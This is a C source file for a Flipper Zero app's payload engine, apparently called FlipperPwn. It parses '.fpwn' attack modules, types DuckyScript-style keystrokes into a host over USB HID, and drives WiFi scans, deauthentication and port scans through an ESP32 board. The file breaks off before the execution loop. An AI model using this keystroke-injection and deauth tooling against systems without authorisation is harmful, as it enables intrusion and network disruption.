/**
 * payload_engine.c — FlipperPwn payload engine
 *
 * Handles .fpwn module scanning, option loading, and DuckyScript-like
 * payload execution over USB HID.
 *
 * .fpwn file format:
 *   NAME <module name>
 *   DESCRIPTION <description text>
 *   CATEGORY <recon|credential|exploit|post>
 *   PLATFORMS <WIN,MAC,LINUX>
 *   OPTION <name> <default> "<description>"
 *   PLATFORM WIN
 *   <ducky commands>
 *   PLATFORM MAC
 *   <ducky commands>
 *   PLATFORM LINUX
 *   <ducky commands>
 */

#include "flipperpwn.h"
#include "wifi_uart.h"
#include "marauder.h"
#include <string.h>
#include <stdlib.h>

#define TAG "FPwn"

/* =========================================================================
 * Internal helpers
 * ========================================================================= */

/**
 * Read one line from a storage file into buf (max buf_size bytes).
 * Strips the trailing newline. Returns number of chars written (0 at EOF).
 */
static size_t fpwn_read_line(File* file, char* buf, size_t buf_size) {
    size_t pos = 0;
    uint8_t byte;

    while(pos < buf_size - 1) {
        uint16_t read = storage_file_read(file, &byte, 1);
        if(read == 0) break; /* EOF */
        if(byte == '\r') continue; /* skip CR in CRLF */
        if(byte == '\n') break;
        buf[pos++] = (char)byte;
    }

    buf[pos] = '\0';
    return pos;
}

/**
 * Trim leading and trailing whitespace in-place.
 * Returns pointer to the first non-space character.
 */
static char* fpwn_trim(char* s) {
    while(*s == ' ' || *s == '\t')
        s++;
    size_t len = strlen(s);
    while(len > 0 && (s[len - 1] == ' ' || s[len - 1] == '\t')) {
        s[--len] = '\0';
    }
    return s;
}

/**
 * Parse the PLATFORMS header value ("WIN,MAC,LINUX") into a bitmask.
 */
static uint8_t fpwn_parse_platforms(const char* val) {
    uint8_t mask = 0;
    /* Work on a local copy so we can tokenise without modifying the arg */
    char buf[64];
    strncpy(buf, val, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* p = buf;
    while(*p) {
        /* Find the next comma or end of string */
        char* comma = strchr(p, ',');
        if(comma) *comma = '\0';
        char* t = fpwn_trim(p);
        if(strcmp(t, "WIN") == 0)
            mask |= FPwnPlatformWindows;
        else if(strcmp(t, "MAC") == 0)
            mask |= FPwnPlatformMac;
        else if(strcmp(t, "LINUX") == 0)
            mask |= FPwnPlatformLinux;
        if(comma)
            p = comma + 1;
        else
            break;
    }
    return mask;
}

/**
 * Parse the CATEGORY header value into the enum.
 */
static FPwnCategory fpwn_parse_category(const char* val) {
    if(strcmp(val, "recon") == 0) return FPwnCategoryRecon;
    if(strcmp(val, "credential") == 0) return FPwnCategoryCredential;
    if(strcmp(val, "exploit") == 0) return FPwnCategoryExploit;
    if(strcmp(val, "post") == 0) return FPwnCategoryPost;
    return FPwnCategoryRecon; /* safe default */
}

/* =========================================================================
 * HID key typing
 * ========================================================================= */

/**
 * Map a single ASCII character to a HID keycode + shift flag.
 * Returns false if the character cannot be mapped.
 */
static bool fpwn_char_to_hid(char c, uint16_t* keycode, bool* need_shift) {
    *need_shift = false;

    /* Lowercase letters */
    if(c >= 'a' && c <= 'z') {
        *keycode = HID_KEYBOARD_A + (uint16_t)(c - 'a');
        return true;
    }
    /* Uppercase letters */
    if(c >= 'A' && c <= 'Z') {
        *keycode = HID_KEYBOARD_A + (uint16_t)(c - 'A');
        *need_shift = true;
        return true;
    }
    /* Digits */
    if(c >= '1' && c <= '9') {
        *keycode = HID_KEYBOARD_1 + (uint16_t)(c - '1');
        return true;
    }
    if(c == '0') {
        *keycode = HID_KEYBOARD_0;
        return true;
    }

    /* Space and common punctuation */
    switch(c) {
    case ' ':
        *keycode = HID_KEYBOARD_SPACEBAR;
        return true;
    case '\t':
        *keycode = HID_KEYBOARD_TAB;
        return true;
    case '\n':
        *keycode = HID_KEYBOARD_RETURN;
        return true;
    case '-':
        *keycode = HID_KEYBOARD_MINUS;
        return true;
    case '_':
        *keycode = HID_KEYBOARD_MINUS;
        *need_shift = true;
        return true;
    case '=':
        *keycode = HID_KEYBOARD_EQUAL_SIGN;
        return true;
    case '+':
        *keycode = HID_KEYBOARD_EQUAL_SIGN;
        *need_shift = true;
        return true;
    case '[':
        *keycode = HID_KEYBOARD_OPEN_BRACKET;
        return true;
    case '{':
        *keycode = HID_KEYBOARD_OPEN_BRACKET;
        *need_shift = true;
        return true;
    case ']':
        *keycode = HID_KEYBOARD_CLOSE_BRACKET;
        return true;
    case '}':
        *keycode = HID_KEYBOARD_CLOSE_BRACKET;
        *need_shift = true;
        return true;
    case '\\':
        *keycode = HID_KEYBOARD_BACKSLASH;
        return true;
    case '|':
        *keycode = HID_KEYBOARD_BACKSLASH;
        *need_shift = true;
        return true;
    case ';':
        *keycode = HID_KEYBOARD_SEMICOLON;
        return true;
    case ':':
        *keycode = HID_KEYBOARD_SEMICOLON;
        *need_shift = true;
        return true;
    case '\'':
        *keycode = HID_KEYBOARD_APOSTROPHE;
        return true;
    case '"':
        *keycode = HID_KEYBOARD_APOSTROPHE;
        *need_shift = true;
        return true;
    case '`':
        *keycode = HID_KEYBOARD_GRAVE_ACCENT;
        return true;
    case '~':
        *keycode = HID_KEYBOARD_GRAVE_ACCENT;
        *need_shift = true;
        return true;
    case ',':
        *keycode = HID_KEYBOARD_COMMA;
        return true;
    case '<':
        *keycode = HID_KEYBOARD_COMMA;
        *need_shift = true;
        return true;
    case '.':
        *keycode = HID_KEYBOARD_DOT;
        return true;
    case '>':
        *keycode = HID_KEYBOARD_DOT;
        *need_shift = true;
        return true;
    case '/':
        *keycode = HID_KEYBOARD_SLASH;
        return true;
    case '?':
        *keycode = HID_KEYBOARD_SLASH;
        *need_shift = true;
        return true;
    case '!':
        *keycode = HID_KEYBOARD_1;
        *need_shift = true;
        return true;
    case '@':
        *keycode = HID_KEYBOARD_2;
        *need_shift = true;
        return true;
    case '#':
        *keycode = HID_KEYBOARD_3;
        *need_shift = true;
        return true;
    case '$':
        *keycode = HID_KEYBOARD_4;
        *need_shift = true;
        return true;
    case '%':
        *keycode = HID_KEYBOARD_5;
        *need_shift = true;
        return true;
    case '^':
        *keycode = HID_KEYBOARD_6;
        *need_shift = true;
        return true;
    case '&':
        *keycode = HID_KEYBOARD_7;
        *need_shift = true;
        return true;
    case '*':
        *keycode = HID_KEYBOARD_8;
        *need_shift = true;
        return true;
    case '(':
        *keycode = HID_KEYBOARD_9;
        *need_shift = true;
        return true;
    case ')':
        *keycode = HID_KEYBOARD_0;
        *need_shift = true;
        return true;
    default:
        return false;
    }
}

/** Type a single ASCII character via HID press/release. */
static void fpwn_type_char(char c) {
    uint16_t keycode;
    bool need_shift;

    if(!fpwn_char_to_hid(c, &keycode, &need_shift)) {
        FURI_LOG_W(TAG, "No HID mapping for char 0x%02x", (uint8_t)c);
        return;
    }

    if(need_shift) {
        furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | keycode);
        furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | keycode);
    } else {
        furi_hal_hid_kb_press(keycode);
        furi_hal_hid_kb_release(keycode);
    }
    /* Small inter-key delay to avoid dropped keystrokes */
    furi_delay_ms(5);
}

/** Type a full NUL-terminated string via HID. */
static void fpwn_type_string(const char* s) {
    while(*s) {
        fpwn_type_char(*s);
        s++;
    }
}

/**
 * Map a named key string (e.g. "a", "RETURN", "F5") to a HID keycode.
 * Returns 0 if not found.
 */
static uint16_t fpwn_named_key(const char* name) {
    /* Single character */
    if(name[0] != '\0' && name[1] == '\0') {
        uint16_t kc;
        bool shift;
        if(fpwn_char_to_hid(name[0], &kc, &shift)) return kc;
    }
    /* Named keys */
    if(strcmp(name, "ENTER") == 0 || strcmp(name, "RETURN") == 0) return HID_KEYBOARD_RETURN;
    if(strcmp(name, "TAB") == 0) return HID_KEYBOARD_TAB;
    if(strcmp(name, "ESCAPE") == 0 || strcmp(name, "ESC") == 0) return HID_KEYBOARD_ESCAPE;
    if(strcmp(name, "SPACE") == 0) return HID_KEYBOARD_SPACEBAR;
    if(strcmp(name, "BACKSPACE") == 0) return HID_KEYBOARD_DELETE;
    if(strcmp(name, "DELETE") == 0) return HID_KEYBOARD_DELETE_FORWARD;
    if(strcmp(name, "HOME") == 0) return HID_KEYBOARD_HOME;
    if(strcmp(name, "END") == 0) return HID_KEYBOARD_END;
    if(strcmp(name, "PAGEUP") == 0) return HID_KEYBOARD_PAGE_UP;
    if(strcmp(name, "PAGEDOWN") == 0) return HID_KEYBOARD_PAGE_DOWN;
    if(strcmp(name, "UP") == 0) return HID_KEYBOARD_UP_ARROW;
    if(strcmp(name, "DOWN") == 0) return HID_KEYBOARD_DOWN_ARROW;
    if(strcmp(name, "LEFT") == 0) return HID_KEYBOARD_LEFT_ARROW;
    if(strcmp(name, "RIGHT") == 0) return HID_KEYBOARD_RIGHT_ARROW;
    /* Function keys */
    if(strcmp(name, "F1") == 0) return HID_KEYBOARD_F1;
    if(strcmp(name, "F2") == 0) return HID_KEYBOARD_F2;
    if(strcmp(name, "F3") == 0) return HID_KEYBOARD_F3;
    if(strcmp(name, "F4") == 0) return HID_KEYBOARD_F4;
    if(strcmp(name, "F5") == 0) return HID_KEYBOARD_F5;
    if(strcmp(name, "F6") == 0) return HID_KEYBOARD_F6;
    if(strcmp(name, "F7") == 0) return HID_KEYBOARD_F7;
    if(strcmp(name, "F8") == 0) return HID_KEYBOARD_F8;
    if(strcmp(name, "F9") == 0) return HID_KEYBOARD_F9;
    if(strcmp(name, "F10") == 0) return HID_KEYBOARD_F10;
    if(strcmp(name, "F11") == 0) return HID_KEYBOARD_F11;
    if(strcmp(name, "F12") == 0) return HID_KEYBOARD_F12;
    return 0;
}

/* =========================================================================
 * Template substitution
 * ========================================================================= */

/**
 * Perform in-place {{OPTION_NAME}} substitution on `src`, writing to `dst`
 * (dst_size bytes available). Looks up option values from `module`.
 */
static void
    fpwn_substitute(const char* src, char* dst, size_t dst_size, const FPwnModule* module) {
    size_t di = 0; /* write cursor */
    const char* p = src;

    while(*p && di < dst_size - 1) {
        /* Look for opening {{ */
        if(p[0] == '{' && p[1] == '{') {
            const char* start = p + 2;
            const char* end = strstr(start, "}}");
            if(end) {
                /* Extract option name */
                size_t name_len = (size_t)(end - start);
                if(name_len < FPWN_OPT_NAME_LEN) {
                    char opt_name[FPWN_OPT_NAME_LEN];
                    memcpy(opt_name, start, name_len);
                    opt_name[name_len] = '\0';

                    /* Look up the option value */
                    const char* replacement = NULL;
                    for(uint8_t i = 0; i < module->option_count; i++) {
                        if(strcmp(module->options[i].name, opt_name) == 0) {
                            replacement = module->options[i].value;
                            break;
                        }
                    }

                    if(replacement) {
                        size_t rlen = strlen(replacement);
                        size_t space = dst_size - 1 - di;
                        size_t copy = rlen < space ? rlen : space;
                        memcpy(dst + di, replacement, copy);
                        di += copy;
                    } else {
                        /* Unknown placeholder — copy verbatim */
                        size_t raw_len = name_len + 4; /* {{ + name + }} */
                        size_t space = dst_size - 1 - di;
                        size_t copy = raw_len < space ? raw_len : space;
                        memcpy(dst + di, p, copy);
                        di += copy;
                    }
                    p = end + 2;
                    continue;
                }
            }
        }
        dst[di++] = *p++;
    }
    dst[di] = '\0';
}

/* =========================================================================
 * Command execution
 * ========================================================================= */

/**
 * Execute a single substituted DuckyScript-like command line.
 * `app` is required for WiFi commands; all non-WiFi commands ignore it.
 */
static void fpwn_exec_command(const char* line, FPwnApp* app) {
    /* Skip empty lines and comments */
    if(line[0] == '\0' || line[0] == '#') return;

    /* ---- DELAY ---- */
    if(strncmp(line, "DELAY ", 6) == 0) {
        uint32_t ms = (uint32_t)atoi(line + 6);
        furi_delay_ms(ms);
        return;
    }

    /* ---- STRING ---- */
    if(strncmp(line, "STRING ", 7) == 0) {
        fpwn_type_string(line + 7);
        return;
    }

    /* ---- Single named keys ---- */
    if(strcmp(line, "ENTER") == 0 || strcmp(line, "RETURN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        return;
    }
    if(strcmp(line, "TAB") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_TAB);
        furi_hal_hid_kb_release(HID_KEYBOARD_TAB);
        return;
    }
    if(strcmp(line, "ESCAPE") == 0 || strcmp(line, "ESC") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_ESCAPE);
        furi_hal_hid_kb_release(HID_KEYBOARD_ESCAPE);
        return;
    }
    if(strcmp(line, "BACKSPACE") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_DELETE);
        furi_hal_hid_kb_release(HID_KEYBOARD_DELETE);
        return;
    }
    if(strcmp(line, "DELETE") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_DELETE_FORWARD);
        furi_hal_hid_kb_release(HID_KEYBOARD_DELETE_FORWARD);
        return;
    }
    if(strcmp(line, "HOME") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_HOME);
        furi_hal_hid_kb_release(HID_KEYBOARD_HOME);
        return;
    }
    if(strcmp(line, "END") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_END);
        furi_hal_hid_kb_release(HID_KEYBOARD_END);
        return;
    }
    if(strcmp(line, "PAGEUP") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_PAGE_UP);
        furi_hal_hid_kb_release(HID_KEYBOARD_PAGE_UP);
        return;
    }
    if(strcmp(line, "PAGEDOWN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_PAGE_DOWN);
        furi_hal_hid_kb_release(HID_KEYBOARD_PAGE_DOWN);
        return;
    }
    if(strcmp(line, "UP") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_UP_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_UP_ARROW);
        return;
    }
    if(strcmp(line, "DOWN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_DOWN_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_DOWN_ARROW);
        return;
    }
    if(strcmp(line, "LEFT") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_LEFT_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_LEFT_ARROW);
        return;
    }
    if(strcmp(line, "RIGHT") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_RIGHT_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_RIGHT_ARROW);
        return;
    }

    /* ---- Modifier combos ---- */

    /* CTRL ALT <key> — must check before lone CTRL/ALT */
    if(strncmp(line, "CTRL ALT ", 9) == 0) {
        uint16_t kc = fpwn_named_key(line + 9);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | kc);
        }
        return;
    }

    /* CTRL <key> */
    if(strncmp(line, "CTRL ", 5) == 0) {
        uint16_t kc = fpwn_named_key(line + 5);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | kc);
        }
        return;
    }

    /* ALT <key> */
    if(strncmp(line, "ALT ", 4) == 0) {
        uint16_t kc = fpwn_named_key(line + 4);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | kc);
        }
        return;
    }

    /* SHIFT <key> */
    if(strncmp(line, "SHIFT ", 6) == 0) {
        uint16_t kc = fpwn_named_key(line + 6);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | kc);
        }
        return;
    }

    /* GUI / WINDOWS / COMMAND <key> */
    const char* gui_arg = NULL;
    if(strncmp(line, "GUI ", 4) == 0)
        gui_arg = line + 4;
    else if(strncmp(line, "WINDOWS ", 8) == 0)
        gui_arg = line + 8;
    else if(strncmp(line, "COMMAND ", 8) == 0)
        gui_arg = line + 8;

    if(gui_arg) {
        uint16_t kc = fpwn_named_key(gui_arg);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | kc);
        }
        return;
    }

    /* Function keys as standalone lines (F1…F12) */
    uint16_t fkey = fpwn_named_key(line);
    if(fkey) {
        furi_hal_hid_kb_press(fkey);
        furi_hal_hid_kb_release(fkey);
        return;
    }

    /* ---- WiFi commands (require ESP32 Dev Board) ---- */

    /* WIFI_SCAN — trigger AP scan and wait for results */
    if(strcmp(line, "WIFI_SCAN") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_SCAN: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_scan_ap(app->marauder);
        /* Wait up to 10 seconds for scan results */
        for(int i = 0; i < 100; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        fpwn_marauder_stop_scan(app->marauder);
        return;
    }

    /* WIFI_JOIN <SSID> <PASSWORD> */
    if(strncmp(line, "WIFI_JOIN ", 10) == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_JOIN: ESP32 not connected, skipping");
            return;
        }
        const char* args = line + 10;
        /* Parse SSID (first token) and password (remainder after first space) */
        const char* space = strchr(args, ' ');
        char ssid[33];
        char password[64];
        if(space) {
            size_t ssid_len = (size_t)(space - args);
            if(ssid_len > 32) ssid_len = 32;
            memcpy(ssid, args, ssid_len);
            ssid[ssid_len] = '\0';
            strncpy(password, space + 1, sizeof(password) - 1);
            password[sizeof(password) - 1] = '\0';
        } else {
            strncpy(ssid, args, sizeof(ssid) - 1);
            ssid[sizeof(ssid) - 1] = '\0';
            password[0] = '\0';
        }
        /* Find matching AP index in scan results; default to 0 if not found */
        uint32_t ap_count = 0;
        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
        uint8_t ap_idx = 0;
        for(uint32_t i = 0; i < ap_count; i++) {
            if(strcmp(aps[i].ssid, ssid) == 0) {
                ap_idx = (uint8_t)i;
                break;
            }
        }
        fpwn_marauder_join(app->marauder, ap_idx, password);
        furi_delay_ms(3000); /* Wait for association */
        return;
    }

    /* WIFI_DEAUTH */
    if(strcmp(line, "WIFI_DEAUTH") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_DEAUTH: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_deauth(app->marauder);
        return;
    }

    /* PING_SCAN */
    if(strcmp(line, "PING_SCAN") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "PING_SCAN: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_ping_scan(app->marauder);
        /* Wait up to 30 seconds for ping scan */
        for(int i = 0; i < 300; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        return;
    }

    /* PORT_SCAN <TARGET_IP> */
    if(strncmp(line, "PORT_SCAN ", 10) == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "PORT_SCAN: ESP32 not connected, skipping");
            return;
        }
        const char* target = line + 10;
        /* Find host index by IP; default to 0 if not found */
        uint32_t host_count = 0;
        FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &host_count);
        uint8_t host_idx = 0;
        for(uint32_t i = 0; i < host_count; i++) {
            if(strcmp(hosts[i].ip, target) == 0) {
                host_idx = (uint8_t)i;
                break;
            }
        }
        fpwn_marauder_port_scan(app->marauder, host_idx, false);
        /* Wait up to 60 seconds */
        for(int i = 0; i < 600; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        return;
    }

    /* WIFI_RESULT — type accumulated WiFi scan results as keystrokes */
    if(strcmp(line, "WIFI_RESULT") == 0) {
        if(!app->marauder) {
            FURI_LOG_W(TAG, "WIFI_RESULT: no marauder, skipping");
            return;
        }
        /* Type AP results */
        uint32_t ap_count = 0;
        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
        for(uint32_t i = 0; i < ap_count; i++) {
            char buf[128];
            snprintf(
                buf,
                sizeof(buf),
                "%s  %s  %ddBm  CH%u",
                aps[i].ssid,
                aps[i].bssid,
                (int)aps[i].rssi,
                (unsigned)aps[i].channel);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        /* Type host results */
        uint32_t host_count = 0;
        FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &host_count);
        for(uint32_t i = 0; i < host_count; i++) {
            if(!hosts[i].alive) continue;
            char buf[32];
            snprintf(buf, sizeof(buf), "%s alive", hosts[i].ip);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        /* Type port results */
        uint32_t port_count = 0;
        FPwnPortResult* ports = fpwn_marauder_get_ports(app->marauder, &port_count);
        for(uint32_t i = 0; i < port_count; i++) {
            if(!ports[i].open) continue;
            char buf[48];
            snprintf(
                buf, sizeof(buf), "%u/tcp open %s", (unsigned)ports[i].port, ports[i].service);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        return;
    }

    /* WIFI_WAIT <ms> — sleep for a fixed duration during WiFi operations */
    if(strncmp(line, "WIFI_WAIT ", 10) == 0) {
        uint32_t ms = (uint32_t)atoi(line + 10);
        if(ms > 60000) ms = 60000; /* cap at 60 s to prevent runaway delays */
        furi_delay_ms(ms);
        return;
    }

    FURI_LOG_W(TAG, "Unrecognised command: %s", line);
}

/* =========================================================================
 * fpwn_modules_scan
 * ========================================================================= */

void fpwn_modules_scan(FPwnApp* app) {
    furi_assert(app);

    app->module_count = 0;

    Storage* storage = app->storage;
    File* dir = storage_file_alloc(storage);
    File* file = storage_file_alloc(storage);

    if(!storage_dir_open(dir, FPWN_MODULES_DIR)) {
        FURI_LOG_W(TAG, "Cannot open modules dir: %s", FPWN_MODULES_DIR);
        storage_file_free(dir);
        storage_file_free(file);
        return;
    }

    char fname[100]; /* 23 (modules dir) + 1 (/) + 99 = 123 < FPWN_PATH_LEN */
    FileInfo finfo;

    while(app->module_count < FPWN_MAX_MODULES) {
        if(!storage_dir_read(dir, &finfo, fname, sizeof(fname))) break;

        /* Only process .fpwn files */
        size_t flen = strlen(fname);
        if(flen < 6 || strcmp(fname + flen - 5, ".fpwn") != 0) continue;

        /* Build full path */
        FPwnModule* mod = &app->modules[app->module_count];
        memset(mod, 0, sizeof(FPwnModule));

        snprintf(mod->file_path, FPWN_PATH_LEN, "%s/%s", FPWN_MODULES_DIR, fname);

        if(!storage_file_open(file, mod->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
            FURI_LOG_W(TAG, "Cannot open: %s", mod->file_path);
            continue;
        }

        /* Read header lines until we see a blank line, OPTION, or PLATFORM */
        char line[FPWN_MAX_LINE_LEN];
        bool header_done = false;

        while(!header_done) {
            size_t n = fpwn_read_line(file, line, sizeof(line));
            if(n == 0 && storage_file_eof(file)) break;

            char* trimmed = fpwn_trim(line);

            if(strncmp(trimmed, "NAME ", 5) == 0) {
                strncpy(mod->name, trimmed + 5, FPWN_NAME_LEN - 1);
            } else if(strncmp(trimmed, "DESCRIPTION ", 12) == 0) {
                strncpy(mod->description, trimmed + 12, FPWN_DESC_LEN - 1);
            } else if(strncmp(trimmed, "CATEGORY ", 9) == 0) {
                mod->category = fpwn_parse_category(trimmed + 9);
            } else if(strncmp(trimmed, "PLATFORMS ", 10) == 0) {
                mod->platforms = fpwn_parse_platforms(trimmed + 10);
            } else if(strncmp(trimmed, "OPTION ", 7) == 0 || strncmp(trimmed, "PLATFORM ", 9) == 0) {
                /* Reached payload section — stop reading */
                header_done = true;
            }
            /* Empty lines inside the header are allowed; skip them */
        }

        storage_file_close(file);

        /* Require at least a name */
        if(mod->name[0] == '\0') {
            FURI_LOG_W(TAG, "Skipping nameless module: %s", mod->file_path);
            continue;
        }

        FURI_LOG_I(TAG, "Loaded module header: %s", mod->name);
        app->module_count++;
    }

    storage_dir_close(dir);
    storage_file_free(dir);
    storage_file_free(file);

    FURI_LOG_I(TAG, "Scan complete: %lu modules found", (unsigned long)app->module_count);
}

/* =========================================================================
 * fpwn_module_load_full
 * ========================================================================= */

bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
    furi_assert(app);

    if(index >= app->module_count) return false;

    FPwnModule* module = &app->modules[index];
    if(module->options_loaded) return true;

    Storage* storage = app->storage;
    File* file = storage_file_alloc(storage);

    if(!storage_file_open(file, module->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Cannot open for full load: %s", module->file_path);
        storage_file_free(file);
        return false;
    }

    module->option_count = 0;
    char line[FPWN_MAX_LINE_LEN];

    while(!storage_file_eof(file)) {
        size_t n = fpwn_read_line(file, line, sizeof(line));
        if(n == 0 && storage_file_eof(file)) break;

        char* trimmed = fpwn_trim(line);

        /*
         * OPTION format: OPTION <name> <default_value> "<description>"
         *
         * We split on the first space after "OPTION " to get the name,
         * then the next space for the default value, then strip quotes
         * from the remaining description.
         */
        if(strncmp(trimmed, "OPTION ", 7) != 0) continue;
        if(module->option_count >= FPWN_MAX_OPTIONS) break;

        char* rest = trimmed + 7;

        /* Parse name (first token) */
        char* name_end = strchr(rest, ' ');
        if(!name_end) continue;
        *name_end = '\0';
        const char* opt_name = rest;
        rest = name_end + 1;

        /* Parse default value (second token) */
        char* val_end = strchr(rest, ' ');
        const char* opt_default;
        const char* opt_desc = "";

        if(val_end) {
            *val_end = '\0';
            opt_default = rest;
            rest = val_end + 1;

            /* Strip surrounding quotes from description */
            char* desc = rest;
            size_t dlen = strlen(desc);
            if(dlen >= 2 && desc[0] == '"' && desc[dlen - 1] == '"') {
                desc[dlen - 1] = '\0';
                desc++;
            }
            opt_desc = desc;
        } else {
            opt_default = rest;
        }

        FPwnOption* opt = &module->options[module->option_count];
        strncpy(opt->name, opt_name, FPWN_OPT_NAME_LEN - 1);
        strncpy(opt->value, opt_default, FPWN_OPT_VALUE_LEN - 1);
        strncpy(opt->description, opt_desc, FPWN_OPT_DESC_LEN - 1);
        opt->name[FPWN_OPT_NAME_LEN - 1] = '\0';
        opt->value[FPWN_OPT_VALUE_LEN - 1] = '\0';
        opt->description[FPWN_OPT_DESC_LEN - 1] = '\0';

        FURI_LOG_D(TAG, "  Option: %s = %s", opt->name, opt->value);
        module->option_count++;
    }

    storage_file_close(file);
    storage_file_free(file);

    module->options_loaded = true;
    FURI_LOG_I(TAG, "Loaded %u option(s) for: %s", module->option_count, module->name);
    return true;
}

/* =========================================================================
 * fpwn_payload_execute_thread
 * ========================================================================= */

/**
 * Map the detected/selected OS enum to the PLATFORM keyword used in .fpwn files.
 */
static const char* fpwn_os_to_platform_tag(FPwnOS os) {
    switch(os) {
    case FPwnOSWindows:
        return "PLATFORM WIN";
    case FPwnOSMac:
        return "PLATFORM MAC";
    case FPwnOSLinux:
        return "PLATFORM LINUX";
    default:
        return "PLATFORM WIN"; /* safest fallback */
    }
}

int32_t fpwn_payload_execute_thread(void* ctx) {
    FPwnApp* app = (FPwnApp*)ctx;
    furi_assert(app);

    FPwnModule* module = &app->modules[app->selected_module_index];

    /* Determine target OS */
    FPwnOS target_os = (app->manual_os != FPwnOSUnknown) ? app->manual_os : fpwn_os_detect();

    const char* platform_tag = fpwn_os_to_platform_tag(target_os);

    FURI_LOG_I(TAG, "Execute: %s  platform: %s", module->name, platform_tag);

    /* --- Phase 1: count lines in the target platform section --- */
    Storage* storage = app->storage;
    File* file = storage_file_alloc(storage);
    uint32_t lines_total = 0;

    if(!storage_file_open(file, module->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Execute: cannot open %s", module->file_path);
        storage_file_free(file);

        /* Mark error in model */
        FPwnExecModel* model = (FPwnExecModel*)view_get_model(app->execute_view);
        strncpy(model->status, "Error: cannot open file", sizeof(model->status) - 1);
        model->error = true;
        model->finished = true;
        view_commit_model(app->execute_view, true);
        return 0;
    }

    {
        char line[FPWN_MAX_LINE_LEN];
        bool in_section = false;

        while(!storage_file_eof(file)) {
            size_t n = fpwn_read_line(file, line, sizeof(line));
            if(n == 0 && storage_file_eof(file)) break;

            char* trimmed = fpwn_trim(line);

            if(!in_section) {
                if(strcmp(trimmed, platform_tag) == 0) in_section = true;
            } else {
                /* A new PLATFORM line ends this section */
                if(strncmp(trimmed, "PLATFORM ", 9) == 0) break;
                if(trimmed[0] != '\0' && trimmed[0] != '#') lines_total++;
            }
        }
    }

    storage_file_close(file);

    /* Publish initial progress */
    {
        FPwnExecModel* model = (FPwnExecModel*)view_get_model(app->execute_view);
        model->lines_done = 0;
        model->lines_total = lines_total;
        model->finished = false;
        model->error = false;
        strncpy(model->status, "Running...", sizeof(model->status) - 1);
        view_commit_model(app->execute_view, true);
    }

    /* --- Phase 2: execute --- */
